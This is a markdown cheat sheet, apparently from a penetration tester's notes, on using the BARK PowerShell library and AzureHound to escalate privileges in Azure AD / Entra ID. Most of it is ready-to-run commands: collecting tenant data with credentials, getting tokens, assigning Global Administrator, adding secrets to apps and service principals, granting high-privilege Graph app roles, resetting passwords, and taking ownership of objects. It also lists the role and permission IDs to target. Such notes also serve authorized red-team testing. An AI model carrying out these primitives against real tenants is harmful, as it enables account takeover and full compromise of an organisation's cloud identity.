# BARK

**Tags:** `#bark` `#azuread` `#entraid` `#microsoft365` `#cloud` `#postexploitation` `#abusepath` `#powershell` `#bloodhound`

BloodHound Attack Research Kit — PowerShell library for executing Azure AD / Entra ID attack primitives. Not an enumeration tool; it's a targeted execution tool. Each function performs one specific abuse (add member to group, grant app role, reset password, add secret to SP, etc.) that directly maps to BloodHound Azure attack edges. Use after BloodHound / roadrecon has identified a path.

**Source:** https://github.com/BloodHoundAD/BARK
**AzureHound (data collector):** https://github.com/BloodHoundAD/AzureHound
**Install:**
```powershell
git clone https://github.com/BloodHoundAD/BARK
. .\BARK.ps1
```

> [!note] **BARK workflow** — Collect with AzureHound → import into BloodHound → identify attack path → execute each hop with the matching BARK primitive. BARK functions map 1:1 to BloodHound Azure edges (AZAddMember, AZGrantAppRoles, AZResetPassword, AZOwns, etc.).

---

## AzureHound — BloodHound Data Collection

```bash
# Collect all Azure AD + Azure resource relationships
./azurehound -u "user@company.com" -p "Password1" list --tenant "<tenant-id>" -o output.json

# With access token
./azurehound -j "<access-token>" list --tenant "<tenant-id>" -o output.json

# Specific collections
./azurehound list users --tenant "<tenant-id>"
./azurehound list groups --tenant "<tenant-id>"
./azurehound list roles --tenant "<tenant-id>"
./azurehound list service-principals --tenant "<tenant-id>"
./azurehound list az-role-assignments --tenant "<tenant-id>"

# Import into BloodHound: drag and drop output.json into the UI
```

---

## Authentication

BARK works with raw tokens rather than Az module sessions.

```powershell
# Get MS Graph token interactively
$token = Get-MSGraphTokenWithUsernamePassword -TenantID <tid> -Username <upn> -Password <pw>

# From client credentials (service principal)
$token = Get-MSGraphTokenWithClientCredentials `
  -ClientID <app-id> -ClientSecret <secret> -TenantID <tid>

# From refresh token
$token = Get-MSGraphTokenWithRefreshToken -RefreshToken <rt> -TenantID <tid>

# Test token is valid
Test-MGToken -Token $token
```

---

## Group Manipulation (AZAddMember)

```powershell
# Add user to group
Invoke-AZAddGroupMember `
  -TargetGroupId "<group-object-id>" `
  -PrincipalId "<user-object-id>" `
  -Token $token

# Remove member
Invoke-AZRemoveGroupMember `
  -TargetGroupId "<group-object-id>" `
  -PrincipalId "<user-object-id>" `
  -Token $token

# Get group members
Get-AZGroupMembers -GroupID "<group-object-id>" -Token $token
```

---

## Role Assignments (AZGrantRole)

```powershell
# Assign a directory role to a user
Invoke-AZGrantRole `
  -PrincipalId "<user-object-id>" `
  -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `  # Global Administrator
  -Token $token
```

**Common role definition IDs:**

| Role | ID |
|---|---|
| Global Administrator | `62e90394-69f5-4237-9190-012177145e10` |
| Privileged Role Administrator | `e8611ab8-c189-46e8-94e1-60213ab1f814` |
| Application Administrator | `9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3` |
| User Administrator | `fe930be7-5e62-47db-91af-98c3a49a38b1` |
| Authentication Administrator | `c4e39bd9-1100-46d3-8c65-fb160da0071f` |

---

## App & SP Secret Abuse (AZAddSecret)

```powershell
# Add secret to an app registration (requires Application.ReadWrite.All or app ownership)
Invoke-AZAddSecretToApp `
  -AppObjectId "<app-object-id>" `
  -Token $token
# Returns new client secret — use with app's client ID to auth as that application

# Add secret to a service principal
Invoke-AZAddSecretToSP `
  -SPObjectId "<sp-object-id>" `
  -Token $token
```

---

## App Role Grants (AZGrantAppRoles)

```powershell
# Grant MS Graph app role to a service principal (requires AppRoleAssignment.ReadWrite.All)
# E.g. grant RoleManagement.ReadWrite.Directory for full role control
Invoke-AZGrantAppRoles `
  -SPObjectId "<service-principal-object-id>" `
  -AppRoleId "<app-role-id>" `
  -ResourceSPObjectId "<ms-graph-sp-object-id>" `
  -Token $token
```

**Useful MS Graph app role IDs:**

| Permission | ID |
|---|---|
| RoleManagement.ReadWrite.Directory | `9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8` |
| Directory.ReadWrite.All | `19dbc75e-c2e2-444c-a770-ec69d8559fc7` |
| AppRoleAssignment.ReadWrite.All | `06b708a9-e830-4db3-a914-8e69da51d44f` |

---

## Password Reset (AZResetPassword)

```powershell
# Reset a user's password (requires Authentication Administrator or higher)
Invoke-AZResetUserPassword `
  -TargetUserID "<user-object-id>" `
  -NewPassword "P@ssw0rd123!" `
  -Token $token
```

---

## Ownership Abuse (AZOwns)

If your account owns an app/SP/group, you can escalate through it.

```powershell
# Add yourself as owner of an app registration
Invoke-AZAddOwnerToApp `
  -AppObjectId "<app-object-id>" `
  -PrincipalId "<your-user-object-id>" `
  -Token $token

# Add yourself as owner of a service principal
Invoke-AZAddOwnerToSP `
  -SPObjectId "<sp-object-id>" `
  -PrincipalId "<your-user-object-id>" `
  -Token $token

# Add yourself as owner of a group
Invoke-AZAddOwnerToGroup `
  -GroupObjectId "<group-object-id>" `
  -PrincipalId "<your-user-object-id>" `
  -Token $token
```

---

## Recon

```powershell
# Global Admins
Get-AZGlobalAdminRoleMembers -Token $token

# Members of any role
Get-AZRoleMembers -RoleDefinitionId "<role-id>" -Token $token

# App registrations + owners
Get-AZApplications -Token $token
Get-AZApplicationOwners -AppObjectId "<app-id>" -Token $token

# Service principals
Get-AZServicePrincipals -Token $token
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
